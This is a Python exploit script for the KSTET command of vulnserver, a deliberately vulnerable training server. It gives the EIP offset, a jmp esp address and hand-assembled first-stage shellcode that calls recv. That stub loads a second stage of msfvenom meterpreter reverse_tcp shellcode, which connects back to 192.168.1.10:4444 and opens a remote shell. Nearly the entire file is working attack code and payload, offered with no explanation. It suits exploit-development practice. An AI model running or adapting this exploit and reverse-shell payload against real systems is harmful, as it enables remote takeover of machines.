# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

# EIP offset: 66
#   0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\PT LabMachine\Desktop\vulnserver\essfunc.dll)
# EBB8              jmp short 0xffffffba
# Badchars: '\x00'
# Location of recv function:  0040252C
# Location of socket descriptor: 0184FB68   0000005C  \...
# Location of Buffer: 0184F9D2   41               INC ECX
# Buffer length: 200 (512 bytes)
# flags: 00

#First Stage assembly
#0188F99A   54               PUSH ESP
#0188F99B   59               POP ECX
#0188F99C   66:81C1 8801     ADD CX,188
#0188F9A1   83EC 50          SUB ESP,50
#0188F9A4   33DB             XOR EBX,EBX
#0188F9A6   53               PUSH EBX
#0188F9A7   33D2             XOR EDX,EDX
#0188F9A9   80C6 02          ADD DH,2
#0188F9AC   52               PUSH EDX
#0188F9AD   04 42            ADD AL,42
#0188F9AF   50               PUSH EAX
#0188F9B0   FF31             PUSH DWORD PTR DS:[ECX]
#0188F9B2   B8 112C2540      MOV EAX,40252C11
#0188F9B7   C1E8 08          SHR EAX,8
#0188F9BA   FFD0             CALL EAX

# Shellcode command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b ‘\x00’ -f python -v secondStage


import socket
import time

cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.1.12',9999))
print cnct.recv(1024)

firstStage = "\x54\x59\x66\x81\xC1\x88\x01\x83\xEc\x50\x33\xDB\x53\x33\xD2\x80\xC6\x02\x52\x04\x42\x50\xFF\x31\xB8\x11\x2C\x25\x40\xC1\xE8\x08\xFF\xD0"
secondStage =  ""
secondStage += "\xba\x48\xf2\x38\xfb\xd9\xeb\xd9\x74\x24\xf4"
secondStage += "\x5e\x2b\xc9\xb1\x56\x31\x56\x13\x03\x56\x13"
secondStage += "\x83\xee\xb4\x10\xcd\x07\xac\x57\x2e\xf8\x2c"
secondStage += "\x38\xa6\x1d\x1d\x78\xdc\x56\x0d\x48\x96\x3b"
secondStage += "\xa1\x23\xfa\xaf\x32\x41\xd3\xc0\xf3\xec\x05"
secondStage += "\xee\x04\x5c\x75\x71\x86\x9f\xaa\x51\xb7\x6f"
secondStage += "\xbf\x90\xf0\x92\x32\xc0\xa9\xd9\xe1\xf5\xde"
secondStage += "\x94\x39\x7d\xac\x39\x3a\x62\x64\x3b\x6b\x35"
secondStage += "\xff\x62\xab\xb7\x2c\x1f\xe2\xaf\x31\x1a\xbc"
secondStage += "\x44\x81\xd0\x3f\x8d\xd8\x19\x93\xf0\xd5\xeb"
secondStage += "\xed\x35\xd1\x13\x98\x4f\x22\xa9\x9b\x8b\x59"
secondStage += "\x75\x29\x08\xf9\xfe\x89\xf4\xf8\xd3\x4c\x7e"
secondStage += "\xf6\x98\x1b\xd8\x1a\x1e\xcf\x52\x26\xab\xee"
secondStage += "\xb4\xaf\xef\xd4\x10\xf4\xb4\x75\x00\x50\x1a"
secondStage += "\x89\x52\x3b\xc3\x2f\x18\xd1\x10\x42\x43\xbd"
secondStage += "\xd5\x6f\x7c\x3d\x72\xe7\x0f\x0f\xdd\x53\x98"
secondStage += "\x23\x96\x7d\x5f\x32\xb0\x7d\x8f\xfc\xd1\x83"
secondStage += "\x30\xfc\xf8\x47\x64\xac\x92\x6e\x05\x27\x63"
secondStage += "\x8e\xd0\xdd\x69\x18\x1b\x89\x6f\xd2\xf3\xcb"
secondStage += "\x6f\xf3\x5f\x42\x89\xa3\x0f\x04\x06\x04\xe0"
secondStage += "\xe4\xf6\xec\xea\xeb\x29\x0c\x15\x26\x42\xa7"
secondStage += "\xfa\x9e\x3a\x50\x62\xbb\xb1\xc1\x6b\x16\xbc"
secondStage += "\xc2\xe0\x92\x40\x8c\x00\xd7\x52\xf9\x76\x17"
secondStage += "\xab\xfa\x12\x17\xc1\xfe\xb4\x40\x7d\xfd\xe1"
secondStage += "\xa6\x22\xfe\xc7\xb5\x25\x00\x96\x8f\x5e\x37"
secondStage += "\x0c\xaf\x08\x38\xc0\x2f\xc9\x6e\x8a\x2f\xa1"
secondStage += "\xd6\xee\x7c\xd4\x18\x3b\x11\x45\x8d\xc4\x43"
secondStage += "\x39\x06\xad\x69\x64\x60\x72\x92\x43\xf2\x75"
secondStage += "\x6c\x11\xdd\xdd\x04\xe9\x5d\xde\xd4\x83\x5d"
secondStage += "\x8e\xbc\x58\x71\x21\x0c\xa0\x58\x6a\x04\x2b"
secondStage += "\x0d\xd8\xb5\x2c\x04\xbc\x6b\x2c\xab\x65\x9c"
secondStage += "\x57\xc4\x9a\x5d\xa8\xcc\xfe\x5e\xa8\xf0\x00"
secondStage += "\x63\x7e\xc9\x76\xa2\x42\x6e\x88\x91\xe7\xc7"
secondStage += "\x03\xd9\xb4\x18\x06"



evilString = firstStage + "\x90" * 32 + "\xdf\x11\x50\x62" + "\xEB\xB8" +"C" * 18
cnct.send("KSTET /.:/"+evilString)
time.sleep(2)
cnct.send(secondStage)
cnct.close()
